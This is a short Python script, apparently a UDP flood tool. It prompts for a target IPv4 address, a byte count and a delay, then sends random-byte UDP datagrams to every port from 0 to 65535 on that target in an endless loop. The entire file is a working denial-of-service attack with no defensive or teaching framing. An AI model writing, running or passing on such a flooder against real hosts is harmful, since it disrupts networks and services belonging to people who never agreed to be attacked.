import socket 
import time 
import os

DEST_IP = (input("Specify IPv4 of target\n> "))
BYTES = int(input("Specify amount of bytes to send\n> "))
TIMEOUT = float(input("Specify the timeout between packages sent\n> "))
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

while True:
    for port in range(0, 2**16):
        sock.sendto(os.urandom(BYTES), (DEST_IP, port))
        print(f"Package {port} sent")
        time.sleep(TIMEOUT)
